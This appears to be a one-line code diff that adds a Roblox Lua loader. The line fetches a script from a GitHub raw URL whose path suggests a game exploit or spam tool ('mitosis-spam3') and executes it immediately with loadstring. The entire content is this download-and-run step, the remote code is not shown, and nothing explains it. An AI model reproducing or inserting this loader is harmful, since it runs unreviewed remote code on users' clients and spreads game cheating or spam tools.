@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/mitosis-spam3-v4rhmfnjmb0ez7.lua"))()
